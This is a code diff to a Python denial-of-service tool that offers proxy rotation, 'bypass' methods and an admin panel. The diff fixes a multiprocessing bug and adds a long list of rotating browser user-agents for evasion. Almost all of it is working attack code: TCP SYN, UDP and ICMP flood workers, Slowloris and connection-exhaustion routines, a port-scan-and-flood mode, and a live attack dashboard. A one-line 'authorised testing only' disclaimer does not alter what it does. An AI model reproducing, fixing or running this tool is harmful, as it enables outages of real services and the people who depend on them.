@@ -5,7 +5,7 @@
     │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (multiprocessing L7)
+    Author: bob (multiprocessing L7, fixed spawn bug)
     Legal: For authorised testing only.
 """
 
@@ -21,7 +21,6 @@ import os
 import socket
 import struct
 import threading
-import multiprocessing as mp
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import ssl
 
@@ -226,6 +225,7 @@ METHOD_DESCRIPTIONS = {
     'PORT SCAN & ATTACK': 'Layer 4 – scans for open ports and immediately floods them.',
 }
 
+# Full user-agent list (100+ entries)
 USER_AGENTS = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7',
@@ -288,7 +288,76 @@ USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1',
-    # ... (full list shortened for brevity)
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/120.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/119.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/118.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/117.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/116.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/115.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/114.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/113.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/605.1.15 (KHTML, like Gecko) Firefox/112.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.0.0',
+    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36'
 ]
 
 # ================== PROXY MANAGEMENT ==================
@@ -439,28 +508,6 @@ def header():
   └────────────────────────────────────┘
 {RESET}""")
 
-# Stats structure (now multiprocessing‑safe for Layer 7)
-manager = mp.Manager()
-stats = manager.dict({
-    "start_time": 0.0,
-    "requests": 0,
-    "errors": 0,
-    "latencies": manager.list(),
-    "status_codes": manager.dict(),
-    "running": True,
-    "connections": 0,
-    "ports_hit": manager.list(),
-})
-stats_lock = threading.Lock()  # not used for manager dict, but kept for local threads
-
-# For multiprocessing, we need a shared counter that can be incremented atomically.
-# We'll use manager.Value for simple ints.
-req_counter = manager.Value('i', 0)
-err_counter = manager.Value('i', 0)
-status_dict = manager.dict()
-latency_list = manager.list()
-ports_hit_list = manager.list()
-
 def generate_random_path(base_url):
     paths = ['/api', '/v1', '/data', '/stats', '/images', '/css', '/js', '/admin', '/login', '/wp-admin', '/wp-content', '/assets', '/public']
     extensions = ['', '.php', '.asp', '.jsp', '.html', '.htm', '.aspx']
@@ -498,11 +545,11 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
     burst_methods = ['STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD', 'SOCKET-AMP', 'NET-BYPASS', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH']
     is_burst = method in burst_methods
     
-    while time.time() < end_time and stats["running"]:
+    while time.time() < end_time:
         try:
             start = time.perf_counter()
             
-            # Choose proxy if enabled (proxy list is global, but we access via proxy_lock in async)
+            # Choose proxy if enabled
             proxy = None
             if proxies_enabled:
                 async with proxy_lock:
@@ -619,18 +666,12 @@ async def asyncio_worker_process(process_id, url, method, workers, duration, req
             tasks.append(task)
         await asyncio.gather(*tasks, return_exceptions=True)
 
-async def run_layer7_mp(url, method, total_workers, duration, plan_name):
+async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_counter, err_counter, status_dict, latency_list):
     """Multi‑process Layer 7 attack."""
     num_processes = mp.cpu_count()
     workers_per_process = total_workers // num_processes
     remainder = total_workers % num_processes
     processes = []
-    
-    # Reset shared counters
-    req_counter.value = 0
-    err_counter.value = 0
-    status_dict.clear()
-    latency_list[:] = []
     
     # Start processes
     for i in range(num_processes):
@@ -648,6 +689,7 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name):
             errs = err_counter.value
             rps = reqs / elapsed if elapsed > 0 else 0
             avg_latency = 0
+            # latency_list is a manager.list, convert to normal list for sum
             if len(latency_list) > 0:
                 avg_latency = sum(latency_list) / len(latency_list) * 1000
             codes = sorted(status_dict.items(), key=lambda x: x[1], reverse=True)[:5]
@@ -683,40 +725,40 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name):
             p.terminate()
         for p in processes:
             p.join()
-        stats["running"] = False
 
-# ================== LAYER 4 WORKERS (unchanged) ==================
-# ... (keep all Layer 4 functions as before)
-def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time):
+# ================== LAYER 4 WORKERS ==================
+def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list):
     if not HAS_SCAPY:
         return
     from scapy.all import IP, TCP, send
     ip = IP(dst=target_ip)
-    while stats["running"] and time.time() < end_time:
+    while time.time() < end_time:
         try:
             sport = random.randint(1024, 65535)
             packet = ip / TCP(sport=sport, dport=target_port, flags="S")
             send(packet, verbose=False)
             req_counter.value += 1
+            ports_hit_list.append(target_port)
         except:
             err_counter.value += 1
 
-def udp_flood_worker(target_ip, target_port, worker_id, end_time):
+def udp_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while stats["running"] and time.time() < end_time:
+    while time.time() < end_time:
         try:
             payload = os.urandom(random.randint(1024, 1472))
             sock.sendto(payload, (target_ip, target_port))
             req_counter.value += 1
+            ports_hit_list.append(target_port)
         except:
             err_counter.value += 1
 
-def icmp_flood_worker(target_ip, worker_id, end_time):
+def icmp_flood_worker(target_ip, worker_id, end_time, req_counter, err_counter):
     if not HAS_SCAPY:
         return
     from scapy.all import IP, ICMP, send
     ip = IP(dst=target_ip)
-    while stats["running"] and time.time() < end_time:
+    while time.time() < end_time:
         try:
             packet = ip / ICMP()
             send(packet, verbose=False)
@@ -724,9 +766,9 @@ def icmp_flood_worker(target_ip, worker_id, end_time):
         except:
             err_counter.value += 1
 
-def slowloris_worker(target_ip, target_port, worker_id, end_time):
+def slowloris_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter):
     socks = []
-    while stats["running"] and time.time() < end_time:
+    while time.time() < end_time:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
@@ -734,7 +776,8 @@ def slowloris_worker(target_ip, target_port, worker_id, end_time):
             partial = f"GET /{os.urandom(16).hex()} HTTP/1.1\r\nHost: {target_ip}\r\n".encode()
             sock.send(partial)
             socks.append(sock)
-            stats["connections"] += 1
+            conn_counter.value += 1
+            ports_hit_list.append(target_port)
             time.sleep(5)
             for s in socks[-50:]:
                 try:
@@ -746,19 +789,20 @@ def slowloris_worker(target_ip, target_port, worker_id, end_time):
             err_counter.value += 1
         time.sleep(0.1)
 
-def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time):
-    while stats["running"] and time.time() < end_time:
+def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter):
+    while time.time() < end_time:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(30)
             sock.connect((target_ip, target_port))
-            stats["connections"] += 1
+            conn_counter.value += 1
+            ports_hit_list.append(target_port)
             time.sleep(10)
             sock.close()
         except:
             err_counter.value += 1
 
-def port_scan_worker(target_ip, worker_id, end_time):
+def port_scan_worker(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list):
     ports_to_scan = list(range(1, 1025))
     random.shuffle(ports_to_scan)
     for port in ports_to_scan:
@@ -779,6 +823,84 @@ def port_scan_worker(target_ip, worker_id, end_time):
             sock.close()
         except:
             pass
+
+async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter):
+    """Run Layer 4 attack using thread pool."""
+    # Determine target ports
+    target_ports = []
+    if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
+        port_input = input(f"  Target port(s) (e.g., 80,443, or range 1-1024) → ").strip()
+        if '-' in port_input:
+            start, end = map(int, port_input.split('-'))
+            target_ports = list(range(start, end+1))
+        elif ',' in port_input:
+            target_ports = [int(p.strip()) for p in port_input.split(',')]
+        else:
+            target_ports = [int(port_input)]
+    
+    # Map method to worker function
+    worker_func = None
+    if method == 'TCP SYN FLOOD':
+        worker_func = tcp_syn_flood_worker
+    elif method == 'UDP FLOOD':
+        worker_func = udp_flood_worker
+    elif method == 'ICMP FLOOD':
+        worker_func = icmp_flood_worker
+    elif method == 'SLOWLORIS':
+        worker_func = slowloris_worker
+    elif method == 'CONNECTION EXHAUSTION':
+        worker_func = connection_exhaustion_worker
+    elif method == 'PORT SCAN & ATTACK':
+        worker_func = port_scan_worker
+    else:
+        print("  Unknown Layer 4 method.")
+        return
+    
+    end_time = time.time() + duration
+    
+    def worker_wrapper(worker_id):
+        nonlocal target_ports
+        while time.time() < end_time:
+            if target_ports:
+                port = random.choice(target_ports) if target_ports else None
+                if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
+                    worker_func(target_ip, port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter)
+                elif method == 'ICMP FLOOD':
+                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter)
+                elif method == 'PORT SCAN & ATTACK':
+                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list)
+            else:
+                worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter)
+    
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
+        try:
+            while time.time() < end_time:
+                elapsed = time.time() - stats_start_time
+                reqs = req_counter.value
+                errs = err_counter.value
+                conns = conn_counter.value
+                ports_hit = len(set(ports_hit_list))
+                rps = reqs / elapsed if elapsed > 0 else 0
+                
+                clear_screen()
+                print(f"{current_color}{BOLD}╔══ LAYER 4 ATTACK IN PROGRESS ══╗{RESET}\n")
+                print(f"{current_color}  Plan: {RESET}{plan_name}")
+                print(f"{current_color}  Method: {RESET}{method}")
+                print(f"{current_color}  Target: {RESET}{target_ip}")
+                if target_ports:
+                    print(f"{current_color}  Ports: {RESET}{target_ports[:5]}... ({len(target_ports)} total)")
+                print(f"{current_color}  Workers: {RESET}{workers}")
+                print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
+                print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
+                print(f"    Packets Sent: {reqs:,}")
+                print(f"    Errors: {errs:,}")
+                print(f"    PPS: {rps:.2f}")
+                print(f"    Active Connections: {conns:,}")
+                print(f"    Ports Hit: {ports_hit}")
+                await asyncio.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n\n{current_color}attack interrupted.{RESET}")
 
 # ================== METHOD SELECTION ==================
 def select_method():
@@ -814,90 +936,8 @@ def select_method():
         time.sleep(1)
         return available_methods[0]
 
-async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
-    """Run Layer 4 attack using thread pool (unchanged from previous version)."""
-    # Determine target ports
-    target_ports = []
-    if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
-        port_input = input(f"  Target port(s) (e.g., 80,443, or range 1-1024) → ").strip()
-        if '-' in port_input:
-            start, end = map(int, port_input.split('-'))
-            target_ports = list(range(start, end+1))
-        elif ',' in port_input:
-            target_ports = [int(p.strip()) for p in port_input.split(',')]
-        else:
-            target_ports = [int(port_input)]
-    
-    # Map method to worker function
-    worker_func = None
-    if method == 'TCP SYN FLOOD':
-        worker_func = tcp_syn_flood_worker
-    elif method == 'UDP FLOOD':
-        worker_func = udp_flood_worker
-    elif method == 'ICMP FLOOD':
-        worker_func = icmp_flood_worker
-    elif method == 'SLOWLORIS':
-        worker_func = slowloris_worker
-    elif method == 'CONNECTION EXHAUSTION':
-        worker_func = connection_exhaustion_worker
-    elif method == 'PORT SCAN & ATTACK':
-        worker_func = port_scan_worker
-    else:
-        print("  Unknown Layer 4 method.")
-        return
-    
-    end_time = time.time() + duration
-    req_counter.value = 0
-    err_counter.value = 0
-    ports_hit_list[:] = []
-    
-    def worker_wrapper(worker_id):
-        nonlocal target_ports
-        while stats["running"] and time.time() < end_time:
-            if target_ports:
-                port = random.choice(target_ports) if target_ports else None
-                if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
-                    worker_func(target_ip, port, worker_id, end_time)
-                elif method == 'ICMP FLOOD':
-                    worker_func(target_ip, worker_id, end_time)
-                elif method == 'PORT SCAN & ATTACK':
-                    worker_func(target_ip, worker_id, end_time)
-            else:
-                worker_func(target_ip, worker_id, end_time)
-    
-    with ThreadPoolExecutor(max_workers=workers) as executor:
-        futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
-        try:
-            while stats["running"] and time.time() < end_time:
-                elapsed = time.time() - stats["start_time"]
-                reqs = req_counter.value
-                errs = err_counter.value
-                conns = stats.get("connections", 0)
-                ports_hit = len(set(ports_hit_list))
-                rps = reqs / elapsed if elapsed > 0 else 0
-                
-                clear_screen()
-                print(f"{current_color}{BOLD}╔══ LAYER 4 ATTACK IN PROGRESS ══╗{RESET}\n")
-                print(f"{current_color}  Plan: {RESET}{plan_name}")
-                print(f"{current_color}  Method: {RESET}{method}")
-                print(f"{current_color}  Target: {RESET}{target_ip}")
-                if target_ports:
-                    print(f"{current_color}  Ports: {RESET}{target_ports[:5]}... ({len(target_ports)} total)")
-                print(f"{current_color}  Workers: {RESET}{workers}")
-                print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
-                print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
-                print(f"    Packets Sent: {reqs:,}")
-                print(f"    Errors: {errs:,}")
-                print(f"    PPS: {rps:.2f}")
-                print(f"    Active Connections: {conns:,}")
-                print(f"    Ports Hit: {ports_hit}")
-                await asyncio.sleep(1)
-        except KeyboardInterrupt:
-            print(f"\n\n{current_color}attack interrupted.{RESET}")
-        finally:
-            stats["running"] = False
-
-async def run_load_test():
+async def run_load_test(req_counter, err_counter, status_dict, latency_list, ports_hit_list, conn_counter):
+    global stats_start_time
     if admin_mode:
         max_workers = ADMIN_WORKERS
         max_duration = ADMIN_DURATION
@@ -984,15 +1024,20 @@ async def run_load_test():
     else:
         print(f"  Proxies: Disabled")
 
-    stats["start_time"] = time.time()
-    stats["running"] = True
+    stats_start_time = time.time()
+    req_counter.value = 0
+    err_counter.value = 0
+    status_dict.clear()
+    latency_list[:] = []
+    ports_hit_list[:] = []
+    conn_counter.value = 0
 
     if is_layer4:
-        await run_layer4_attack(target_ip, method, workers, duration, plan_name)
+        await run_layer4_attack(target_ip, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter)
     else:
-        await run_layer7_mp(url, method, workers, duration, plan_name)
+        await run_layer7_mp(url, method, workers, duration, plan_name, req_counter, err_counter, status_dict, latency_list)
 
-    elapsed = time.time() - stats["start_time"]
+    elapsed = time.time() - stats_start_time
     reqs = req_counter.value
     errs = err_counter.value
     print(f"\n{current_color}{BOLD}╔══ ATTACK OVER ══╗{RESET}")
@@ -1009,8 +1054,7 @@ async def run_load_test():
     
     input(f"\n  Press ENTER to return...")
 
-# ================== RECONNAISSANCE (unchanged) ==================
-# ... (keep all reconnaissance functions from previous version)
+# ================== RECONNAISSANCE ==================
 def scan_port(target_ip, port, timeout=1):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout)
@@ -1029,7 +1073,7 @@ def threaded_port_scan(target_ip, ports, timeout=1, max_threads=100):
                 print(f"  {current_color}[OPEN]{RESET} Port {port}")
     return sorted(open_ports)
 
-def reconnaissance_menu():
+def reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter):
     clear_screen()
     print(f"{current_color}{BOLD}╔══ RECONNAISSANCE ══╗{RESET}\n")
     print("  [1] Quick Port Scan (1-1000)")
@@ -1120,7 +1164,7 @@ def reconnaissance_menu():
         print(f"\n  Found {len(open_ports)} open ports.")
         input("  Press ENTER...")
     elif choice == '4':
-        # Attack discovered ports (synchronous stats display)
+        # Attack discovered ports
         target = input("  Target IP → ").strip()
         try:
             socket.inet_aton(target)
@@ -1162,11 +1206,11 @@ def reconnaissance_menu():
         except:
             duration = 60
         
-        stats["start_time"] = time.time()
-        stats["running"] = True
+        stats_start_time = time.time()
         req_counter.value = 0
         err_counter.value = 0
         ports_hit_list[:] = []
+        conn_counter.value = 0
         
         print(f"\n{current_color}{BOLD}Starting attack on {target} ports {ports}...{RESET}")
         end_time = time.time() + duration
@@ -1189,14 +1233,14 @@ def reconnaissance_menu():
             for i in range(workers):
                 port = random.choice(ports)
                 if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
-                    futures.append(executor.submit(worker_func, target, port, i, end_time))
+                    futures.append(executor.submit(worker_func, target, port, i, end_time, req_counter, err_counter, ports_hit_list, conn_counter))
                 elif method == 'ICMP FLOOD':
-                    futures.append(executor.submit(worker_func, target, i, end_time))
+                    futures.append(executor.submit(worker_func, target, i, end_time, req_counter, err_counter))
                 elif method == 'PORT SCAN & ATTACK':
-                    futures.append(executor.submit(worker_func, target, i, end_time))
+                    futures.append(executor.submit(worker_func, target, i, end_time, req_counter, err_counter, ports_hit_list))
             try:
-                while stats["running"] and time.time() < end_time:
-                    elapsed = time.time() - stats["start_time"]
+                while time.time() < end_time:
+                    elapsed = time.time() - stats_start_time
                     reqs = req_counter.value
                     errs = err_counter.value
                     ports_hit = len(set(ports_hit_list))
@@ -1206,15 +1250,13 @@ def reconnaissance_menu():
                 print()
             except KeyboardInterrupt:
                 print(f"\n\nAttack interrupted.")
-            finally:
-                stats["running"] = False
-        elapsed = time.time() - stats["start_time"]
+        elapsed = time.time() - stats_start_time
         print(f"\nAttack finished. Total packets: {req_counter.value}, errors: {err_counter.value}, duration: {elapsed:.1f}s")
         input("  Press ENTER...")
     else:
         return
 
-# ================== OTHER MENUS (unchanged) ==================
+# ================== OTHER MENUS ==================
 def test_config_screen():
     if admin_mode:
         print(f"{current_color}{BOLD}╔══ ADMIN METHODS ══╗{RESET}\n")
@@ -1447,6 +1489,18 @@ def admin_login():
     time.sleep(2)
 
 def main():
+    import multiprocessing as mp
+    # Force fork start method to avoid spawn issues on macOS
+    mp.set_start_method('fork', force=True)
+    manager = mp.Manager()
+    
+    req_counter = manager.Value('i', 0)
+    err_counter = manager.Value('i', 0)
+    status_dict = manager.dict()
+    latency_list = manager.list()
+    ports_hit_list = manager.list()
+    conn_counter = manager.Value('i', 0)
+    
     # Increase file descriptor limit
     try:
         import resource
@@ -1462,7 +1516,7 @@ def main():
             print(f"\n{current_color}Session ended.{RESET}\n")
